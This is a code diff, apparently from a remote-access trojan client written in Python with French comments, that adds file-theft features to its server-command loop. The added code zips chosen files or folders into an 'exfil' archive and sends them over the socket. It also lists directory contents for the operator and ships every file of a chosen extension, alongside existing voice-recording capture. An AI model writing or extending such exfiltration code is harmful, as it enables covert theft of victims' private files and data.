@@ -6,6 +6,9 @@ import os
 import sys
 import time
 import platform
+import zipfile
+import tempfile
+
 
 IS_WINDOWS = platform.system() == "Windows"
 IS_LINUX = platform.system() == "Linux"
@@ -82,34 +85,6 @@ def send_file(client_socket, file_path, file_type):
     except Exception as e:
         print(f"[Erreur] lors de l'envoi : {e}")
 
-# def send_file(client_socket, file_path, file_type):
-#     try:
-#         if not os.path.exists(file_path):
-#             print(f"[-] Fichier non trouvé : {file_path}")
-#             return
-
-#         with open(file_path, "rb") as file:
-#             file_data = file.read()
-
-#         payload = json.dumps({
-#             "type": file_type,
-#             "filename": os.path.basename(file_path),
-#             "data": file_data.hex()
-#         }).encode("utf-8")
-
-#         if file_type == "voice":
-#             # Envoi avec en-tête structuré
-#             client_socket.sendall(b"VOICE")  # 5 bytes de header clair
-#             client_socket.sendall(struct.pack("!I", len(payload)))
-#             client_socket.sendall(payload)
-#         else:
-#             client_socket.sendall(b"JSON_")  # 5 bytes aussi
-#             client_socket.sendall(payload)
-
-#         print(f"[+] Fichier '{file_path}' envoyé au serveur.")
-#     except Exception as e:
-#         print(f"[Erreur] lors de l'envoi : {e}")
-
 
 def wait_for_file(file_path, timeout=10):
     """Attente que le fichier soit généré (jusqu'à 10 secondes)."""
@@ -120,6 +95,20 @@ def wait_for_file(file_path, timeout=10):
             return False
         time.sleep(1)
     return True
+
+
+def compress_path(path):
+    zip_path = os.path.join(tempfile.gettempdir(), f"exfil_{int(time.time())}.zip")
+    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
+        if os.path.isfile(path):
+            zipf.write(path, arcname=os.path.basename(path))
+        else:
+            for root, _, files in os.walk(path):
+                for f in files:
+                    full_path = os.path.join(root, f)
+                    rel_path = os.path.relpath(full_path, start=path)
+                    zipf.write(full_path, arcname=rel_path)
+    return zip_path        
 
 # Lancer un exécutable si présent
 def safe_run(exe_path, args=None, silent=False):
@@ -197,24 +186,47 @@ def handle_commands(client_socket):
                     if wait_for_file(latest_audio):
                         send_file(client_socket, latest_audio, "voice")
                         # os.remove(latest_audio)
-                      
+
+            elif command.startswith("list:"):
+                path = command.split(":", 1)[1]
+                if os.path.exists(path):
+                    listing = []
+                    for root, dirs, files in os.walk(path):
+                        for name in files:
+                            full_path = os.path.join(root, name)
+                            listing.append(full_path)
+                    payload = json.dumps({
+                        "type": "listing",
+                        "filename": "",
+                        "data": "\n".join(listing)
+                    })
+                    client_socket.send(payload.encode("utf-8"))
+                else:
+                    print(f"[!] Chemin invalide : {path}")
+
+            elif command.startswith("exfil:"):
+                path = command.split(":", 1)[1]
+                if os.path.exists(path):
+                    zip_file = compress_path(path)
+                    send_file(client_socket, zip_file, "exfil")
+                    os.remove(zip_file)
+                else:
+                    print(f"[!] Chemin introuvable : {path}")
 
 
-            # elif command == "voice":
-            #     safe_run(VOICE_EXE)  
-                # capture_folder = os.path.join(BASE_DIR, "voice")
-                # os.makedirs(capture_folder, exist_ok=True)
+            elif command.startswith("exfil_ext:"):
+                ext = command.split(":", 1)[1].lower()
+                matches = []
 
-                # # Lancer voice_module pour qu’il enregistre un .wav
-                # subprocess.run([VOICE_EXE, capture_folder], check=True)
+                for root, _, files in os.walk(BASE_DIR):
+                    for f in files:
+                        if f.lower().endswith(ext):
+                            matches.append(os.path.join(root, f))
 
-                # # Trouver le dernier fichier audio
-                # audios = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.endswith(".wav")]
-                # if audios:
-                #     latest_audio = max(audios, key=os.path.getctime)
-                #     if wait_for_file(latest_audio):
-                #         send_file(client_socket, latest_audio, "voice")
-                #         os.remove(latest_audio)
+                for file_path in matches:
+                    send_file(client_socket, file_path, "exfil")
+                    time.sleep(1)
+
     
 
     except Exception as e:
